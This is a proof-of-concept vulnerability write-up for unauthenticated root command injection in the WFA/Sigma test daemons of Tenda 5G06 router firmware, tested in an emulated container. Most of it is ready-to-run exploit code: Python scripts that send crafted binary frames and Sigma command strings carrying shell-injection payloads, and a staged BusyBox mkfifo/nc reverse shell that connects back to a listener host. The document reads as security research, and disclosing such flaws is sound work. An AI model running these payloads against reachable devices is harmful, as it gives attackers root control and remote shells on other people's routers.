# R07 WFA/Sigma Command Injection PoC

## Summary

The Tenda 5G06 firmware includes Wi-Fi Alliance/Sigma test daemons under the
stock init tree. In the close-to-stock `rc.d` boot harness,
`/etc/rc.d/S90wfa_dut` starts `/sbin/wfa_dut` on `0.0.0.0:8000/tcp`.

`wfa_dut` itself accepts unauthenticated binary WFA control frames on `8000/tcp`.
Several parsed command parameters are interpolated into shell commands without
quoting or validation. This allows command injection as root in the firmware
rootfs.

`/sbin/wfa_ca` is not required for exploitation. It is only a convenient Sigma
text-command frontend that translates CAPI strings on `9000/tcp` into the binary
frames consumed by `wfa_dut`.

Confirmed vulnerable paths:

- `sta_get_mac_address` parameter `interface`
- `sta_get_ip_config` parameter `interface`
- `sta_set_ip_config` parameter `ip`, with a short payload because the parser
  truncates this field

## Affected Components

```text
/etc/init.d/wfa_dut
/etc/init.d/sigma
/etc/rc.d/S90wfa_dut
/etc/rc.d/S92sigma
/sbin/wfa_dut
/sbin/wfa_ca
```

Static shell sinks in `/sbin/wfa_dut`:

```text
ifconfig %s > /tmp/ipconfig.txt
getipconfig.sh /tmp/ipconfig.txt %s
/sbin/ifconfig %s %s netmask %s > /dev/null 2>&1
/sbin/route add default gw %s > /dev/null 2>&1
ping %s -c 3 -W %u | grep loss | cut -f3 -d, 1>& /tmp/pingout.txt
```

## Test Environment

Container:

```text
tenda-b104-rcd-procd-20260421_214544
```

Firmware rootfs in the container:

```text
/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
```

Runtime notes:

- The procd-backed `rc.d` harness starts `wfa_dut` on `8000/tcp`.
- `S90wfa_dut` removes/disables `S92sigma`, so `wfa_ca` does not stay running
  from stock-order boot in this harness.
- Direct exploitation of `wfa_dut:8000` is possible without `wfa_ca`.
- For human-readable Sigma text command testing, start `wfa_ca` manually and
  point it at the running `wfa_dut`.

Expected listeners during the PoC:

```text
0.0.0.0:8000  wfa_dut
0.0.0.0:9000  wfa_ca
```

## PoC 0: Direct `wfa_dut:8000` Command Injection

`wfa_dut` does not accept Sigma text commands directly. It expects a binary WFA
TLV frame. For `sta_get_mac_address`, the frame is:

```text
uint16 little-endian tag    = 0x000c
uint16 little-endian length = 0x0274
payload                     = interface string, NUL-padded to 0x0274 bytes
```

Send a crafted frame directly to the stock-started `wfa_dut:8000` listener:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket
import struct

payload = b"ra0;echo DIRECT8000>/tmp/direct_8000;#"
frame = struct.pack("<HH", 12, 0x274) + payload.ljust(0x274, b"\x00")

s = socket.create_connection(("127.0.0.1", 8000), timeout=2)
s.settimeout(3)
s.sendall(frame)

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print("sent", len(frame), "received", len(b"".join(out)), "bytes")
print(b"".join(out).hex())
PY
```

Validated response:

```text
sent 632 received 524 bytes
```

Verify direct code execution:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ls -l "$ROOT/tmp/direct_8000"
cat "$ROOT/tmp/direct_8000"
'
```

Expected marker:

```text
DIRECT8000
```

This is the strongest PoC because it targets the default `wfa_dut` listener
started by `S90wfa_dut`; `wfa_ca` is not involved.

## Start or Restart WFA Services

The following steps are only needed for the Sigma text-command PoCs that use
`wfa_ca:9000`. Run this from the host:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ip link set lo up
ip link set eth0 up
killall wfa_ca 2>/dev/null
env WFA_ENV_AGENT_IPADDR=172.17.0.6 WFA_ENV_AGENT_PORT=8000 \
  chroot "$ROOT" /sbin/wfa_ca br-lan 9000 \
  >"$ROOT/tmp/rcd-procd/wfa_ca_poc.log" 2>&1 &
'
```

Check listeners:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 netstat -ltnp
```

## PoC 1: Marker File Through `sta_get_mac_address`

Send a Sigma CAPI command with a shell metacharacter in the `interface` value:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket

cmd = "sta_get_mac_address,interface,ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;#"
s = socket.create_connection(("127.0.0.1", 9000), timeout=2)
s.settimeout(2)
s.sendall((cmd + "\r\n").encode())

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print(b"".join(out).decode("latin1", "replace"))
PY
```

Expected response:

```text
status,RUNNING
status,COMPLETE,mac,00:00:00:00:00:00
```

Verify code execution:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ls -l "$ROOT/tmp/wfa_inj_iface"
cat "$ROOT/tmp/wfa_inj_iface"
'
```

Expected marker:

```text
WFA_IFACE
```

## PoC 2: Marker File Through `sta_get_ip_config`

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket

cmd = "sta_get_ip_config,interface,ra0;echo WFA_IPCFG>/tmp/wfa_inj_ipcfg;#"
s = socket.create_connection(("127.0.0.1", 9000), timeout=2)
s.settimeout(2)
s.sendall((cmd + "\r\n").encode())

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print(b"".join(out).decode("latin1", "replace"))
PY
```

Expected response:

```text
status,RUNNING
status,COMPLETE,dhcp,1,ip,,mask,,primary-dns,::1,secondary-dns,0
```

Verify:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ls -l "$ROOT/tmp/wfa_inj_ipcfg"
cat "$ROOT/tmp/wfa_inj_ipcfg"
'
```

Expected marker:

```text
WFA_IPCFG
```

## PoC 3: Short Payload Through `sta_set_ip_config`

The `sta_set_ip_config` parser truncates some fields, so use a compact payload.

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket

cmd = (
    "sta_set_ip_config,interface,ra0,dhcp,0,"
    "ip,1;>/tmp/x;#,mask,255.255.255.0,"
    "defaultGateway,192.0.2.1,primary-dns,1.1.1.1,secondary-dns,8.8.8.8"
)
s = socket.create_connection(("127.0.0.1", 9000), timeout=2)
s.settimeout(2)
s.sendall((cmd + "\r\n").encode())

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print(b"".join(out).decode("latin1", "replace"))
PY
```

Expected response:

```text
status,RUNNING
status,COMPLETE
```

Verify:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ls -l "$ROOT/tmp/x"
'
```

Expected result:

```text
/tmp/x exists
```

## PoC 4: Reverse Shell Confirmation

The firmware rootfs does not include `bash`. It includes BusyBox `sh` and
BusyBox `nc`:

```text
/bin/sh -> busybox
/usr/bin/nc -> ../../bin/busybox
```

BusyBox `nc` in this image does not support `-e`, so use a FIFO shell.

Start a listener on the host:

```bash
nc -lvnp 4444
```

Create a staged shell script inside the firmware rootfs:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
cat > "$ROOT/tmp/r" <<'"'"'EOF'"'"'
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f
EOF
chmod +x "$ROOT/tmp/r"
'
```

Trigger it through WFA command injection:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket

cmd = "sta_get_mac_address,interface,ra0;/bin/sh /tmp/r;#"
s = socket.create_connection(("127.0.0.1", 9000), timeout=2)
s.settimeout(1)
s.sendall((cmd + "\r\n").encode())

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print(b"".join(out).decode("latin1", "replace"))
PY
```

Expected WFA-side response:

```text
status,RUNNING
```

The command remains `RUNNING` because the injected shell stays attached to the
listener. In the validated run, the container showed:

```text
172.17.0.6:48766 -> 172.17.0.1:4444 ESTABLISHED
/bin/sh -i
/usr/bin/nc 172.17.0.1 4444
```

Useful verification commands:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 netstat -tnp
docker exec tenda-b104-rcd-procd-20260421_214544 ps -ef
```

## Root Cause

`wfa_ca` parses unauthenticated Sigma text commands and forwards them to
`wfa_dut`. `wfa_dut` then builds shell command strings with untrusted parsed
parameters and executes them through `system()` or `popen()`.

The `sta_get_mac_address` injection maps to this shell template:

```text
ifconfig %s > /tmp/ipconfig.txt
```

An injected value like:

```text
ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;#
```

produces shell behavior equivalent to:

```sh
ifconfig ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;# > /tmp/ipconfig.txt
```

## Impact

An attacker who can reach the WFA/Sigma control path can execute shell commands
as root in the firmware environment. Practical impact includes:

- arbitrary command execution
- Wi-Fi and network configuration changes
- persistence or service manipulation
- traffic generation abuse
- process crash/DoS in additional WFA paths

## Cleanup

Remove PoC artifacts:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
rm -f "$ROOT/tmp/wfa_inj_iface" \
      "$ROOT/tmp/wfa_inj_ipcfg" \
      "$ROOT/tmp/x" \
      "$ROOT/tmp/direct_8000" \
      "$ROOT/tmp/direct_poc" \
      "$ROOT/tmp/f" \
      "$ROOT/tmp/r"
'
```

Restart WFA services if the reverse shell keeps the WFA handler occupied:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
killall wfa_ca wfa_dut 2>/dev/null
chroot "$ROOT" /sbin/wfa_dut "ra0;rai0" 8000 >"$ROOT/tmp/rcd-procd/wfa_dut_restart.log" 2>&1 &
sleep 1
env WFA_ENV_AGENT_IPADDR=172.17.0.6 WFA_ENV_AGENT_PORT=8000 \
  chroot "$ROOT" /sbin/wfa_ca br-lan 9000 >"$ROOT/tmp/rcd-procd/wfa_ca_restart.log" 2>&1 &
'
```
